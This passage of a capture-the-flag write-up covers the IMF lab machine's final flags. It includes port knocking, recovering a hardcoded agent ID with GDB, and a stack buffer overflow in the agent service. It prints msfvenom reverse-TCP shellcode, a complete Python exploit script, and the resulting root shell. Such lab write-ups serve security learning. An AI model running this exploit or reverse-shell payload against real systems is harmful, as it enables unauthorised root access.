+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@imf:/var/www/html/imfadministrator/uploads $ ls -alh
+</span><span class='line'>total 28K
+</span><span class='line'>drwxr-xr-x 2 www-data www-data 4.0K Oct  7 07:29 .
+</span><span class='line'>drwxr-xr-x 4 www-data www-data 4.0K Oct 17  2016 ..
+</span><span class='line'>-rw-r--r-- 1 www-data www-data   82 Oct 12  2016 .htaccess
+</span><span class='line'>-rw-r--r-- 1 www-data www-data  701 Oct  7 07:29 c2fff7999be7.gif
+</span><span class='line'>-rw-r--r-- 1 www-data www-data   30 Oct  7 07:03 c72ad31b04e6.gif
+</span><span class='line'>-rw-r--r-- 1 www-data www-data   30 Oct  7 06:47 d8988628c59f.gif
+</span><span class='line'>-rw-r--r-- 1 www-data www-data   28 Oct 12  2016 flag5_abc123def.txt
+</span><span class='line'>
+</span><span class='line'>$ cat flag5_abc123def.txt
+</span><span class='line'>flag5{YWdlbnRzZXJ2aWNlcw==}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The decoded hint is <code>agentservices</code></p>
+
+<h1>Flag #6 &ndash; Binary exploitation</h1>
+
+<p>I ran a search on the filesystem for files with agent in their name and got 2 hits:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>find / -type f -name agent* 
+</span><span class='line'>/usr/local/bin/agent
+</span><span class='line'>/etc/xinetd.d/agent</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Interestingly, it seems there is an agent server around:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/xinetd.d/agent
+</span><span class='line'># default: on
+</span><span class='line'># description: The agent server serves agent sessions
+</span><span class='line'># unencrypted agentid for authentication.
+</span><span class='line'>service agent
+</span><span class='line'>{
+</span><span class='line'>       flags          = REUSE
+</span><span class='line'>       socket_type    = stream
+</span><span class='line'>       wait           = no
+</span><span class='line'>       user           = root
+</span><span class='line'>       server         = /usr/local/bin/agent
+</span><span class='line'>       log_on_failure += USERID
+</span><span class='line'>       disable        = no
+</span><span class='line'>       port           = 7788
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So it seems the agent service is listening on port 7788 and running as root:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -lnt
+</span><span class='line'>Active Internet connections (only servers)
+</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+</span><span class='line'>tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN  </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next I went to <code>/usr/local/bin</code> where the executable is located:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./agent
+</span><span class='line'>  ___ __  __ ___ 
+</span><span class='line'> |_ _|  \/  | __|  Agent
+</span><span class='line'>  | || |\/| | _|   Reporting
+</span><span class='line'> |___|_|  |_|_|    System
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Agent ID : </span></code></pre></td></tr></table></div></figure>
+
+
+<p>We need to give it a valid agent ID for authentication. Inside the folder there is also another file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@imf:/usr/local/bin $ cat access_codes
+</span><span class='line'>SYN 7482,8279,9467</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looks like a port knocking sequence. I borrowed from an example on <a href="https://wiki.archlinux.org/index.php/Port_knocking">ArchLinux wiki</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>for port in 7482 8279 9467; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port 192.168.145.130; done</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And when I ran Nmap again, I found port 7788 is now open to the public:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE
+</span><span class='line'>7788/tcp open  unknown</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Connecting to it takes us to the agent prompt where we have to put the agent ID. I downloaded the agent executable on my system for GDB:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@imf:/usr/local/bin $ :file_download agent /root/agent</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Running strings on it also gives some interesting infomation about extraction points. Anyway, back to the agent ID. In the strings I saw a call to <strong>strncmp</strong>, so when running the executable I set up a breakpoint on main, then ran the program, set a breakpoint to strncmp and gave it some input. Doing so, I noticed what appears to be a hardcoded value in the comparison:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0000| 0xffffd32c --&gt; 0x80486bf (&lt;main+196&gt;: add    esp,0x10)
+</span><span class='line'>0004| 0xffffd330 --&gt; 0xffffd34e ("1234\n")
+</span><span class='line'>0008| 0xffffd334 --&gt; 0x804c1d0 ("48093572")
+</span><span class='line'>0012| 0xffffd338 --&gt; 0x8 
+</span><span class='line'>0016| 0xffffd33c --&gt; 0xf7de4e6b (add    esp,0x10)
+</span><span class='line'>0020| 0xffffd340 --&gt; 0xf7f8a3fc --&gt; 0xf7f8b200 --&gt; 0x0 
+</span><span class='line'>0024| 0xffffd344 --&gt; 0x0 
+</span><span class='line'>0028| 0xffffd348 --&gt; 0x804c1d0 ("48093572")</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I used 48093572 as the agent ID and it worked and took me to a menu:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vn 192.168.145.130 7788
+</span><span class='line'>(UNKNOWN) [192.168.145.130] 7788 (?) open
+</span><span class='line'>  ___ __  __ ___ 
+</span><span class='line'> |_ _|  \/  | __|  Agent
+</span><span class='line'>  | || |\/| | _|   Reporting
+</span><span class='line'> |___|_|  |_|_|    System
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Agent ID : 48093572
+</span><span class='line'>Login Validated 
+</span><span class='line'>Main Menu:
+</span><span class='line'>1. Extraction Points
+</span><span class='line'>2. Request Extraction
+</span><span class='line'>3. Submit Report
+</span><span class='line'>0. Exit
+</span><span class='line'>Enter selection: 1
+</span><span class='line'>
+</span><span class='line'>Extraction Points:
+</span><span class='line'>Staatsoper, Vienna, Austria
+</span><span class='line'>Blenheim Palace, Woodstock, Oxfordshire, England, UK
+</span><span class='line'>Great Windmill Street, Soho, London, England, UK
+</span><span class='line'>Fawley Power Station, Southampton, England, UK
+</span><span class='line'>Underground Station U4 Schottenring, Vienna, Austria
+</span><span class='line'>Old Town Square, Old Town, Prague, Czech Republic
+</span><span class='line'>Drake Hotel - 140 E. Walton Pl., Near North Side, Chicago, Illinois, USA
+</span><span class='line'>Ashton Park, Mosman, Sydney, New South Wales, Australia
+</span><span class='line'>Argyle Place, The Rocks, Sydney, New South Wales, Australia
+</span><span class='line'>
+</span><span class='line'>Enter selection: 2
+</span><span class='line'>
+</span><span class='line'>Extraction Request
+</span><span class='line'>Enter extraction location: Vienna
+</span><span class='line'>
+</span><span class='line'>Location: Vienna
+</span><span class='line'>
+</span><span class='line'>Extraction team has been deployed.
+</span><span class='line'>
+</span><span class='line'>Enter selection: 3
+</span><span class='line'>
+</span><span class='line'>Enter report update: Abort extraction
+</span><span class='line'>Report: Abort extraction
+</span><span class='line'>Submitted for review.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Interesting. The 3rd option is the one that appears to take a variable amount of input, so maybe there&rsquo;s a buffer overflow lurking around. It&rsquo;s been a while since I&rsquo;ve done any binary exploitation. First thing, creating the pattern that might crash the service:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
+</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I used the above string for the report and the program did crash:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>
+</span><span class='line'>[----------------------------------registers-----------------------------------]
+</span><span class='line'>EAX: 0xffffd294 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af\224\322\377\377Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"...)
+</span><span class='line'>EBX: 0x0 
+</span><span class='line'>ECX: 0xf7f8adc7 --&gt; 0xf8b8900a 
+</span><span class='line'>EDX: 0xf7f8b890 --&gt; 0x0 
+</span><span class='line'>ESI: 0xf7f8a000 --&gt; 0x1d5d8c 
+</span><span class='line'>EDI: 0x0 
+</span><span class='line'>EBP: 0x35664134 ('4Af5')
+</span><span class='line'>ESP: 0xffffd340 ("f7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3"...)
+</span><span class='line'>EIP: 0x41366641 ('Af6A')
+</span><span class='line'>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+</span><span class='line'>[-------------------------------------code-------------------------------------]
+</span><span class='line'>Invalid $PC address: 0x41366641</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With my binary exploitation skills unused in a long time, I had to revisit some topics and also take a look at how others solved this. Moving on, a couple of interesting things, EIP gets overwritten by Af6A, which appears at offset 168 of the payload:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./pattern_offset.rb -q Af6A -l 1000
+</span><span class='line'>[*] Exact match at offset 168</span></code></pre></td></tr></table></div></figure>
+
+
+<p>However, if we look at EAX, we see our pattern from the beginning. Which means that if we had some shellcode instead of the pattern, it would get stored in EAX, and to execute it we would need a JMP or a CALL instruction to EAX. Luckily, there&rsquo;s one available!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ jmpcall eax
+</span><span class='line'>0x8048563 : call eax</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now, for the shellcode part. The way of feeding it to the vulnerable program will be using a Python script. I chose a reverse TCP shell for the payload and avoided badchars like nulls and newlines (line feeds and carriage returns):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.145.129 LPORT=8888 -f python -o killagent.py -b "\x00\x0a\x0d"
+</span><span class='line'>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+</span><span class='line'>[-] No arch selected, selecting arch: x86 from the payload
+</span><span class='line'>Found 10 compatible encoders
+</span><span class='line'>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+</span><span class='line'>x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+</span><span class='line'>x86/shikata_ga_nai chosen with final size 95
+</span><span class='line'>Payload size: 95 bytes
+</span><span class='line'>Final size of python file: 470 bytes
+</span><span class='line'>Saved as: killagent.py</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The payload size is 95 bytes:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat killagent.py 
+</span><span class='line'>buf =  ""
+</span><span class='line'>buf += "\xbb\x6e\x01\x4b\xcb\xdb\xcc\xd9\x74\x24\xf4\x5e\x31"
+</span><span class='line'>buf += "\xc9\xb1\x12\x31\x5e\x12\x03\x5e\x12\x83\xa8\x05\xa9"
+</span><span class='line'>buf += "\x3e\x05\xdd\xda\x22\x36\xa2\x77\xcf\xba\xad\x99\xbf"
+</span><span class='line'>buf += "\xdc\x60\xd9\x53\x79\xcb\xe5\x9e\xf9\x62\x63\xd8\x91"
+</span><span class='line'>buf += "\xb4\x3b\x8b\xe0\x5d\x3e\xac\xc0\x25\xb7\x4d\xb4\x30"
+</span><span class='line'>buf += "\x98\xdc\xe7\x0f\x1b\x56\xe6\xbd\x9c\x3a\x80\x53\xb2"
+</span><span class='line'>buf += "\xc9\x38\xc4\xe3\x02\xda\x7d\x75\xbf\x48\x2d\x0c\xa1"
+</span><span class='line'>buf += "\xdc\xda\xc3\xa2"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Under these conditions, we would need to send a buffer of the shellcode + padding + the address of the CALL EAX instruction. Let&rsquo;s see the Python:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'>
+</span><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&quot;192.168.145.130&quot;</span>
+</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">7788</span>
+</span><span class='line'><span class="n">agentid</span> <span class="o">=</span> <span class="s">&quot;48093572</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">menu</span> <span class="o">=</span> <span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.145.129 LPORT=8888 -f python -o killagent.py -# b &quot;\x00\x0a\x0d&quot;</span>
+</span><span class='line'><span class="c"># Size: 95 bytes</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">buf</span> <span class="o">=</span>  <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xbb\x6e\x01\x4b\xcb\xdb\xcc\xd9\x74\x24\xf4\x5e\x31</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc9\xb1\x12\x31\x5e\x12\x03\x5e\x12\x83\xa8\x05\xa9</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x3e\x05\xdd\xda\x22\x36\xa2\x77\xcf\xba\xad\x99\xbf</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xdc\x60\xd9\x53\x79\xcb\xe5\x9e\xf9\x62\x63\xd8\x91</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xb4\x3b\x8b\xe0\x5d\x3e\xac\xc0\x25\xb7\x4d\xb4\x30</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x98\xdc\xe7\x0f\x1b\x56\xe6\xbd\x9c\x3a\x80\x53\xb2</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc9\x38\xc4\xe3\x02\xda\x7d\x75\xbf\x48\x2d\x0c\xa1</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xdc\xda\xc3\xa2</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="mi">168</span>
+</span><span class='line'><span class="n">call</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x63\x85\x04\x08</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">nop</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">pad</span> <span class="o">=</span> <span class="n">nop</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="c"># 73 bytes</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="n">pad</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="n">call</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">agentid</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">menu</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Payload sent. Check your listener.&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And what remains is to execute it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python agentkill.py 
+</span><span class='line'>Payload sent. Check your listener.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And on the listener, mission accomplished!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
+</span><span class='line'>listening on [any] 8888 ...
+</span><span class='line'>connect to [192.168.145.129] from (UNKNOWN) [192.168.145.130] 58634
+</span><span class='line'>whoami
+</span><span class='line'>root
+</span><span class='line'>ls /root
+</span><span class='line'>Flag.txt
+</span><span class='line'>TheEnd.txt
+</span><span class='line'>cat Flag.txt
+</span><span class='line'>flag6{R2gwc3RQcm90MGMwbHM=}
+</span><span class='line'>cat TheEnd.txt
+</span><span class='line'>   ____                        _ __   __   
+</span><span class='line'>  /  _/_ _  ___  ___  ___ ___ (_) /  / /__ 
+</span><span class='line'> _/ //  ' \/ _ \/ _ \(_-&lt;(_-&lt;/ / _ \/ / -_)
+</span><span class='line'>/___/_/_/_/ .__/\___/___/___/_/_.__/_/\__/ 
+</span><span class='line'>   __  __/_/        _                      
+</span><span class='line'>  /  |/  (_)__ ___ (_)__  ___              
+</span><span class='line'> / /|_/ / (_-&lt;(_-&lt;/ / _ \/ _ \             
+</span><span class='line'>/_/__/_/_/___/___/_/\___/_//_/             
+</span><span class='line'>  / __/__  ___________                     
+</span><span class='line'> / _// _ \/ __/ __/ -_)                    
+</span><span class='line'>/_/  \___/_/  \__/\__/                     
+</span><span class='line'>                                           
